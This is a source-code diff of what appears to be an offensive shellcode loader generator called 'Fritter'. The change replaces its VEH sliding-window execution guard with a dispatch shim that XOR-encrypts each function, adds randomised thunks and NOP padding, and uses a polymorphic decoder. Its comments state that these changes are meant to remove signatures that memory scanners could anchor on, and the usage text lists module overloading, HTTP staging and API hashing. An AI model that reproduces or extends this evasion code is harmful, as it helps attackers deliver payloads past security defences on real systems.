+    // only and never dereferences the effective address, so the ModR/M/
+    // SIB/disp bytes are free entropy, safe even when RAX is uninitialized
+    // at entry. Chunk length also varies per iteration, so both the layout
+    // and the bytes within each NOP differ across outputs.
     static uint8_t pfx_buf[64];
     uint32_t pfx_len = 0;
     gen_random(&rnd_byte, 1);
     uint32_t pfx_target = rnd_byte & 0x3F;   // 0..63
     while(pfx_len < pfx_target) {
+      uint32_t remaining = pfx_target - pfx_len;
+      uint32_t cap = remaining < 9 ? remaining : 9;
       gen_random(&rnd_byte, 1);
-      uint32_t idx = rnd_byte % PFX_POOL_COUNT;
-      uint32_t need = pfx_pool[idx].n;
-      if(pfx_len + need > pfx_target) {
-        // would overshoot - fall back to a 1-byte entry (indices 0-3)
-        // (don't name a local "small" - Windows rpcndr.h typedefs it to char)
-        gen_random(&rnd_byte, 1);
-        uint32_t small_idx = rnd_byte & 0x03;
-        pfx_buf[pfx_len++] = pfx_pool[small_idx].b[0];
-        continue;
-      }
-      memcpy(pfx_buf + pfx_len, pfx_pool[idx].b, need);
-      pfx_len += need;
+      uint32_t chunk = 1 + (rnd_byte % cap);   // 1..cap
+      pfx_len += emit_rnd_nop(pfx_buf + pfx_len, chunk);
     }
     DPRINT("Prefix fall-through length: %u (target %u)", pfx_len, pfx_target);
 
@@ -1669,45 +2258,77 @@ static int build_loader(PFRITTER_CONFIG c) {
            decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3,
            key_len, zero_opcode, loop_order);
 
-    // --- VEH shim integration ---
+    // --- Dispatch shim integration (replaces VEH shim) ---
     // Page-pad the shim so the loader starts on a page boundary
     // (VirtualAlloc allocates on 64KB boundaries, so absolute page alignment is guaranteed)
-    uint32_t shim_raw_size = sizeof(VEH_SHIM_EXE_X64);
+    uint32_t shim_raw_size = sizeof(DISPATCH_SHIM_EXE_X64);
     uint32_t shim_padded_size = (shim_raw_size + 0xFFF) & ~0xFFF;  // round up to 4096
-    DPRINT("VEH shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);
+    DPRINT("Dispatch shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);
 
-    // Build combined blob: [shim (page-padded)] [loader]
-    uint32_t combined_size = shim_padded_size + loader_size;
+    // --- N>1 dispatch mode gating ---
+    // When the loader has multiple PE code sections (post-packer), engage
+    // per-function dispatch: append a dispatcher + one thunk per
+    // cross-section call to protected sections at the loader-blob tail.
+    // Single-section builds fall through to v1 whole-loader dispatch.
+    int use_ngt1 = (L_FN_COUNT > 1);
+    int is_resident[16] = {0};
+    uint32_t protected_ref_count = 0;
+    uint32_t disp_slot  = 0;
+    uint32_t thunks_size = 0;
+    uint32_t pre_disp_pad = 0;  /* random 0..63 bytes before dispatcher */
+    int      input_swap  = 0;   /* r10/r11 semantic role, thunk+dispatcher agree */
+    if(use_ngt1) {
+      /* Residency policy: only .text (FritterLoader + MainProcEntry +
+         untagged helpers) stays resident because the shim jmps to its
+         entry directly and Windows calls MainProcEntry via CreateThread.
+         .main_pr is now protected, MainProcEntry's cross-section call
+         to MainProc gets thunkified by the rewriter. */
+      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
+        if(strncmp(L_FNS[i].name, ".text", 5) == 0) {
+          is_resident[i] = 1;
+        }
+      }
+      for(uint32_t i = 0; i < L_REF_COUNT; i++) {
+        if(!is_resident[L_REFS[i].target_fn]) protected_ref_count++;
+      }
+      disp_slot  = DISPATCHER_MAX_SIZE;
+      thunks_size = protected_ref_count * THUNK_SIZE;
+      /* Structural jitter: 0..63 random bytes between loader end and
+         dispatcher entry. Kills the "dispatcher always at loader+0"
+         relative offset that a memory scan could otherwise anchor on. */
+      uint8_t pad_rnd;
+      gen_random(&pad_rnd, 1);
+      pre_disp_pad = pad_rnd & 0x3F;
+      /* Per-build coin flip: which of r10/r11 carries target_off vs
+         callee_id. Kills the fixed "add rax, r10" / "mov r12d, r11d"
+         ModR/M bytes in the dispatcher. */
+      uint8_t swap_rnd;
+      gen_random(&swap_rnd, 1);
+      input_swap = swap_rnd & 1;
+      DPRINT("N>1 dispatch: FN_COUNT=%u REF_COUNT=%u protected_refs=%u pre_disp_pad=%u disp_slot=%u thunks=%u",
+             L_FN_COUNT, L_REF_COUNT, protected_ref_count, pre_disp_pad, disp_slot, thunks_size);
+    }
+    uint32_t tail_extra = pre_disp_pad + disp_slot + thunks_size;
+
+    // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1]
+    uint32_t combined_size = shim_padded_size + loader_size + tail_extra;
     uint8_t *combined = malloc(combined_size);
     if(combined == NULL) {
       return FRITTER_ERROR_NO_MEMORY;
     }
 
     // Copy shim, pad with random bytes (not zeros - looks more natural)
-    memcpy(combined, VEH_SHIM_EXE_X64, shim_raw_size);
+    memcpy(combined, DISPATCH_SHIM_EXE_X64, shim_raw_size);
     if(shim_padded_size > shim_raw_size) {
       gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
     }
 
-    // Patch sentinel values in the shim blob
-    // SENTINEL_LOADER_OFFSET (0xDEAD0001) → offset from shim start to loader
-    // SENTINEL_LOADER_SIZE   (0xDEAD0002) → loader blob size
-    // SENTINEL_VEH_MODE      (0xDEAD0003) → 0=simple RX, 1=VEH sliding window
-    // SENTINEL_PAGE_KEY_HI   (0xDEAD0004) → upper 32 bits of per-page XOR key
-    // SENTINEL_PAGE_KEY_LO   (0xDEAD0005) → lower 32 bits of per-page XOR key
-
-    // Generate per-page encryption master key (used only in VEH mode)
-    uint8_t page_key_bytes[8];
-    gen_random(page_key_bytes, 8);
-    uint64_t page_master_key;
-    memcpy(&page_master_key, page_key_bytes, 8);
-
+    // Patch dispatch shim sentinels (in shim portion of combined):
+    //   SENTINEL_LOADER_OFFSET (0xDEAD0001) -> shim_padded_size
+    //   SENTINEL_LOADER_SIZE   (0xDEAD0002) -> loader_size
+    // VEH_MODE and PAGE_KEY_* sentinels are retired under dispatch.
     {
-      int patched_off = 0, patched_sz = 0, patched_mode = 0;
-      int patched_pk_hi = 0, patched_pk_lo = 0;
-      uint32_t veh_mode_val = (uint32_t)c->chunked;
-      uint32_t pk_hi = (uint32_t)(page_master_key >> 32);
-      uint32_t pk_lo = (uint32_t)(page_master_key & 0xFFFFFFFF);
+      int patched_off = 0, patched_sz = 0;
       for(uint32_t i = 0; i < shim_raw_size - 3; i++) {
         uint32_t val;
         memcpy(&val, combined + i, 4);
@@ -1719,90 +2340,228 @@ static int build_loader(PFRITTER_CONFIG c) {
           memcpy(combined + i, &loader_size, 4);
           patched_sz = 1;
           DPRINT("Patched SENTINEL_LOADER_SIZE at shim+%d -> %d", i, loader_size);
-        } else if(val == 0xDEAD0003 && !patched_mode) {
-          memcpy(combined + i, &veh_mode_val, 4);
-          patched_mode = 1;
-          DPRINT("Patched SENTINEL_VEH_MODE at shim+%d -> %d (%s)", i, veh_mode_val,
-                 veh_mode_val ? "VEH sliding window" : "simple RW->RX");
-        } else if(val == 0xDEAD0004 && !patched_pk_hi) {
-          memcpy(combined + i, &pk_hi, 4);
-          patched_pk_hi = 1;
-          DPRINT("Patched SENTINEL_PAGE_KEY_HI at shim+%d", i);
-        } else if(val == 0xDEAD0005 && !patched_pk_lo) {
-          memcpy(combined + i, &pk_lo, 4);
-          patched_pk_lo = 1;
-          DPRINT("Patched SENTINEL_PAGE_KEY_LO at shim+%d", i);
         }
       }
-      if(!patched_off || !patched_sz || !patched_mode) {
-        DPRINT("ERROR: Failed to patch VEH shim sentinels (off=%d, sz=%d, mode=%d)",
-               patched_off, patched_sz, patched_mode);
-        free(combined);
-        return FRITTER_ERROR_NO_MEMORY;
-      }
-      if(c->chunked && (!patched_pk_hi || !patched_pk_lo)) {
-        DPRINT("ERROR: Failed to patch page key sentinels (hi=%d, lo=%d)",
-               patched_pk_hi, patched_pk_lo);
+      if(!patched_off || !patched_sz) {
+        DPRINT("ERROR: Failed to patch dispatch shim sentinels (off=%d, sz=%d)",
+               patched_off, patched_sz);
         free(combined);
         return FRITTER_ERROR_NO_MEMORY;
       }
     }
 
-    // Copy loader after padded shim
+    // Locate the fn table by marker scan.
+    //   marker  @ +0..7   (F1 7E 7A B1 F1 7E 7A B1, little-endian)
+    //   count   @ +8..11  (patched below per mode)
+    //   pad     @ +12..15
+    //   entry[i] @ +16 + i*12 : {offset, size, key, flags, pad}
+    uint32_t ft_off = 0;
+    {
+      static const uint8_t FN_MARKER[8] = {
+        0xB1, 0x7A, 0x7E, 0xF1, 0xB1, 0x7A, 0x7E, 0xF1
+      };
+      int marker_found = 0;
+      for(uint32_t i = 0; i + 8 <= shim_raw_size; i++) {
+        if(memcmp(combined + i, FN_MARKER, 8) == 0) {
+          ft_off = i;
+          marker_found = 1;
+          break;
+        }
+      }
+      if(!marker_found) {
+        DPRINT("ERROR: dispatch shim fn table marker not found");
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("fn table marker at shim+%u", ft_off);
+    }
+
+    // Copy loader after padded shim. XOR-encryption happens per mode below.
     memcpy(combined + shim_padded_size, loader_blob, loader_size);
 
+    if(use_ngt1) {
+      // --- N>1 per-function dispatch mode ---
+      //
+      // Layout after this block:
+      //   combined = [shim (padded)] [loader (with rewritten disps and
+      //              XOR'd protected sections)] [dispatcher_bytes]
+      //              [thunk_0..thunk_N-1]
+      //
+      // Runtime:
+      //   1. Outer decoder unwraps combined → plaintext at rest state
+      //   2. Shim's decrypt loop skips ALL entries (none have SHIM_DECRYPT)
+      //   3. Shim calls loader_base = start of .text (RESIDENT, plaintext)
+      //   4. FritterLoader executes; cross-section calls now go to thunks
+      //   5. Each thunk: mov r10=target_off; mov r11=callee_id; jmp dispatcher
+      //   6. Dispatcher: XOR-decrypts callee slab, calls it, re-encrypts
+      //   7. FritterLoader returns to shim → shim wipes loader region
+
+      // Random-fill tail area so the dispatcher slot's unused suffix and
+      // any post-thunk padding look like the rest of the encoded region.
+      if(tail_extra > 0) {
+        gen_random(combined + shim_padded_size + loader_size, tail_extra);
+      }
+
+      // Emit dispatcher after pre_disp_pad bytes of random junk. The
+      // padding sits inside the RESIDENT tail entry so nothing tries to
+      // decrypt it; its bytes came from gen_random above.
+      uint32_t disp_off_in_blob   = shim_padded_size + loader_size + pre_disp_pad;
+      uint32_t loader_off_in_blob = shim_padded_size;
+      uint32_t actual_disp_size = emit_dispatcher(combined + disp_off_in_blob,
+                                                   disp_off_in_blob,
+                                                   loader_off_in_blob,
+                                                   ft_off,
+                                                   input_swap);
+      if(actual_disp_size > DISPATCHER_MAX_SIZE) {
+        DPRINT("ERROR: dispatcher emitted %u bytes > slot %u",
+               actual_disp_size, DISPATCHER_MAX_SIZE);
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("Dispatcher: %u bytes at blob+%u (slot %u)",
+             actual_disp_size, disp_off_in_blob, DISPATCHER_MAX_SIZE);
+
+      // Emit thunks + rewrite loader disps for each protected-target ref.
+      // Thunks live at blob+shim_padded+loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE
+      // (so thunk_i's loader-relative offset is loader_size+DISPATCHER_MAX_SIZE+i*THUNK_SIZE).
+      uint32_t thunk_i = 0;
+      for(uint32_t r = 0; r < L_REF_COUNT; r++) {
+        if(is_resident[L_REFS[r].target_fn]) continue;
+
+        // Reconstruct target_blob_off from the packer's disp32 currently
+        // in the loader blob (fritter has this from exe2h emission already,
+        // but reading the disp keeps ref_t compact).
+        int32_t current_disp;
+        memcpy(&current_disp,
+               combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
+               4);
+        uint32_t target_blob_off = (uint32_t)((int32_t)L_REFS[r].src_blob_off
+                                              + L_REFS[r].inst_length
+                                              + current_disp);
+
+        uint32_t thunk_off_in_loader = loader_size + pre_disp_pad
+                                       + DISPATCHER_MAX_SIZE
+                                       + thunk_i * THUNK_SIZE;
+        uint32_t thunk_off_in_blob   = shim_padded_size + thunk_off_in_loader;
+
+        // Dispatcher is at disp_off_in_blob. rel32 from end-of-jmp
+        // (thunk_off_in_blob + THUNK_SIZE) to dispatcher entry.
+        int32_t dispatcher_rel = (int32_t)disp_off_in_blob
+                                 - (int32_t)(thunk_off_in_blob + THUNK_SIZE);
+
+        emit_thunk(combined + thunk_off_in_blob,
+                   target_blob_off,
+                   L_REFS[r].target_fn,
+                   dispatcher_rel,
+                   input_swap);
+
+        // Rewrite the loader's disp32 so the original CALL/JMP now targets
+        // this thunk. disp is loader-relative because both src and thunk
+        // are in the loader region (post shim, pre outer-encode).
+        int32_t new_disp = (int32_t)thunk_off_in_loader
+                           - (int32_t)((int32_t)L_REFS[r].src_blob_off + L_REFS[r].inst_length);
+        memcpy(combined + shim_padded_size + L_REFS[r].src_blob_off + L_REFS[r].disp_offset,
+               &new_disp, 4);
+
+        thunk_i++;
+      }
+      if(thunk_i != protected_ref_count) {
+        DPRINT("ERROR: emitted %u thunks, expected %u", thunk_i, protected_ref_count);
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      DPRINT("Emitted %u thunks; rewrote %u disps", thunk_i, thunk_i);
+
+      // Populate multi-entry fn_table + XOR-encrypt each protected section.
+      uint32_t new_count = L_FN_COUNT + 1;
+      memcpy(combined + ft_off + 8, &new_count, 4);
+      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
+        uint32_t e_off = L_FNS[i].offset;
+        uint32_t e_sz  = L_FNS[i].size;
+        uint8_t  e_key = 0;
+        uint8_t  e_flags;
+        if(is_resident[i]) {
+          e_flags = 0x01;  /* FN_FLAG_RESIDENT */
+        } else {
+          do { gen_random(&e_key, 1); } while(e_key == 0);
+          e_flags = 0x00;  /* dispatcher-managed */
+          for(uint32_t k = 0; k < e_sz; k++) {
+            combined[shim_padded_size + e_off + k] ^= e_key;
+          }
+        }
+        uint8_t *entry = combined + ft_off + 16 + i * 12;
+        memcpy(entry + 0, &e_off, 4);
+        memcpy(entry + 4, &e_sz,  4);
+        entry[8]  = e_key;
+        entry[9]  = e_flags;
+        entry[10] = 0x00;
+        entry[11] = 0x00;
+        DPRINT("  fn[%u] name=%-9.*s off=0x%05x size=0x%04x key=0x%02x flags=0x%02x",
+               i, 8, L_FNS[i].name, e_off, e_sz, e_key, e_flags);
+      }
+      // Trailing entry covers the dispatcher + thunks region as RESIDENT
+      // so the shim's (no-op) decrypt loop skips it and the dispatcher
+      // doesn't try to crypt it either.
+      uint32_t tail_e_off = loader_size;
+      uint32_t tail_e_sz  = pre_disp_pad + DISPATCHER_MAX_SIZE + thunks_size;
+      uint8_t *tail_entry = combined + ft_off + 16 + L_FN_COUNT * 12;
+      memcpy(tail_entry + 0, &tail_e_off, 4);
+      memcpy(tail_entry + 4, &tail_e_sz,  4);
+      tail_entry[8]  = 0;
+      tail_entry[9]  = 0x01;  /* RESIDENT */
+      tail_entry[10] = 0;
+      tail_entry[11] = 0;
+      DPRINT("  fn[%u] tail (dispatch+thunks) off=0x%05x size=0x%04x RESIDENT",
+             L_FN_COUNT, tail_e_off, tail_e_sz);
+      DPRINT("N>1 fn_table populated: count=%u", new_count);
+
+    } else {
+      // --- v1 whole-loader dispatch mode ---
+      // Single fn_table entry covers the loader; shim auto-decrypts.
+      uint8_t fn_key = 0;
+      do { gen_random(&fn_key, 1); } while(fn_key == 0);
+
+      uint32_t one = 1;
+      memcpy(combined + ft_off + 8, &one, 4);
+      uint32_t e_off = 0, e_sz = loader_size;
+      uint8_t  e_flags = 0x02;  /* FN_FLAG_SHIM_DECRYPT */
+      memcpy(combined + ft_off + 16 + 0, &e_off, 4);
+      memcpy(combined + ft_off + 16 + 4, &e_sz,  4);
+      combined[ft_off + 16 + 8]  = fn_key;
+      combined[ft_off + 16 + 9]  = e_flags;
+      combined[ft_off + 16 + 10] = 0x00;
+      combined[ft_off + 16 + 11] = 0x00;
+      DPRINT("Patched fn table: count=1 entry[0]={offset=0 size=%u key=0x%02X flags=0x%02X}",
+             loader_size, fn_key, e_flags);
+
+      // XOR-encrypt the whole loader region with the per-fn key.
+      for(uint32_t i = 0; i < loader_size; i++) {
+        combined[shim_padded_size + i] ^= fn_key;
+      }
+      DPRINT("XOR-encrypted loader region (%u bytes) with fn key 0x%02X",
+             loader_size, fn_key);
+    }
+
+    /* Overwrite the fn_table marker (F1 7E 7A B1 x2) with random bytes.
+       Marker was only needed at build time to locate the table for
+       patching. Leaving it intact would give runtime memory scans a
+       stable 8-byte anchor at a known relative offset within the shim. */
+    gen_random(combined + ft_off, 8);
+    DPRINT("Scrambled fn_table marker at shim+%u", ft_off);
+
+    // Outer decoder wraps the WHOLE combined blob (shim + fn-encrypted loader).
     uint8_t *encoded = malloc(combined_size);
     if(encoded == NULL) {
       free(combined);
       return FRITTER_ERROR_NO_MEMORY;
     }
 
-    if(c->chunked) {
-      // VEH mode: per-page encrypt loader pages, then XOR-encode ONLY the shim
-      // The outer XOR decoder will only decode the shim; loader stays per-page encrypted
-      uint32_t num_pages = (loader_size + 0xFFF) / 0x1000;
-      for(uint32_t pg = 0; pg < num_pages; pg++) {
-        uint32_t pg_offset = pg * 0x1000;
-        uint32_t pg_len = (pg_offset + 0x1000 <= loader_size) ? 0x1000 : (loader_size - pg_offset);
-        uint64_t key = page_master_key ^ (uint64_t)(pg + 1);
+    memcpy(db + counter_imm_offset, &combined_size, 4);
+    DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
+           loader_size, combined_size, shim_padded_size, loader_size);
 
-        uint8_t *page_ptr = combined + shim_padded_size + pg_offset;
-        for(uint32_t b = 0; b < pg_len / 8; b++) {
-          uint64_t *qw = (uint64_t *)(page_ptr + b * 8);
-          *qw ^= key;
-        }
-        // Handle trailing bytes on last page
-        uint32_t remainder = pg_len & 7;
-        if(remainder) {
-          uint8_t *tail = page_ptr + (pg_len & ~7u);
-          uint8_t *kb = (uint8_t *)&key;
-          for(uint32_t r = 0; r < remainder; r++) {
-            tail[r] ^= kb[r];
-          }
-        }
-      }
-      DPRINT("Per-page encrypted %d loader pages", num_pages);
-
-      // Patch decoder counter to decode ONLY the shim
-      memcpy(db + counter_imm_offset, &shim_padded_size, 4);
-      DPRINT("Patched decoder counter: %d (shim only, loader is per-page encrypted)",
-             shim_padded_size);
-
-      // XOR-encode the shim portion (key_mask matches decoder's AND imm)
-      for(uint32_t i = 0; i < shim_padded_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & key_mask];
-      }
-      // Copy per-page encrypted loader as-is
-      memcpy(encoded + shim_padded_size, combined + shim_padded_size, loader_size);
-    } else {
-      // Simple mode: XOR-encode the entire combined blob (shim + loader)
-      memcpy(db + counter_imm_offset, &combined_size, 4);
-      DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
-             loader_size, combined_size, shim_padded_size, loader_size);
-
-      for(uint32_t i = 0; i < combined_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & key_mask];
-      }
+    for(uint32_t i = 0; i < combined_size; i++) {
+      encoded[i] = combined[i] ^ xor_key[i & key_mask];
     }
     free(combined);
 
@@ -2665,7 +3424,7 @@ static void usage (void) {
         printf("    -k, --headers <1-2>       " C_DIM "1=Overwrite (default) 2=Keep all" C_RST "\n");
         printf("    -d, --domain  <name>      " C_DIM "AppDomain name for .NET" C_RST "\n");
         printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n");
-        printf("    -g, --chunked <0-1>       " C_DIM "0=RW->RX  1=VEH sliding window (default)" C_RST "\n\n");
+        printf("    -g, --chunked <0-1>       " C_DIM "(deprecated; dispatch shim always used)" C_RST "\n\n");
 
         printf(C_YEL "  STAGING" C_RST "\n");
         printf("    -n, --modname <name>      " C_DIM "Module name for HTTP staging" C_RST "\n");
@@ -2698,7 +3457,7 @@ static void usage (void) {
         printf("    -k, --headers <1-2>       1=Overwrite (default) 2=Keep all\n");
         printf("    -d, --domain  <name>      AppDomain name for .NET\n");
         printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n");
-        printf("    -g, --chunked <0-1>       0=RW->RX  1=VEH sliding window (default)\n\n");
+        printf("    -g, --chunked <0-1>       (deprecated; dispatch shim always used)\n\n");
 
         printf("  STAGING\n");
         printf("    -n, --modname <name>      Module name for HTTP staging\n");
@@ -2734,7 +3493,7 @@ int main(int argc, char *argv[]) {
     c.entropy   = FRITTER_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
     c.exit_opt  = FRITTER_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
     c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
-    c.chunked   = 1;                      // VEH sliding window (1) or simple RW->RX (0)
+    c.chunked   = 1;                      // legacy flag; retained for CLI compat, unused under dispatch
     
     // get options
     get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
@@ -2843,7 +3602,7 @@ int main(int argc, char *argv[]) {
         printf("    Encryption  " C_WHT "Custom ARX (Chaskey-derived, CTR mode)" C_RST "\n");
         printf("    API Hashing " C_WHT "Maru" C_RST "\n");
         printf("    PE Headers  " C_WHT "%s" C_RST "\n", headers_str);
-        printf("    Exec Guard  " C_WHT "%s" C_RST "\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
+        printf("    Exec Guard  " C_WHT "Dispatch shim (per-fn XOR)" C_RST "\n");
         printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
         printf("    PEB Access  " C_WHT "TEB-indirect (gs:0x30+0x60)" C_RST "\n");
         if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
@@ -2883,7 +3642,7 @@ int main(int argc, char *argv[]) {
         printf("    Encryption  Custom ARX (Chaskey-derived, CTR mode)\n");
         printf("    API Hashing Maru\n");
         printf("    PE Headers  %s\n", headers_str);
-        printf("    Exec Guard  %s\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
+        printf("    Exec Guard  Dispatch shim (per-fn XOR)\n");
         printf("    Decoder     Polymorphic XOR\n");
         printf("    PEB Access  TEB-indirect (gs:0x30+0x60)\n");
         if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
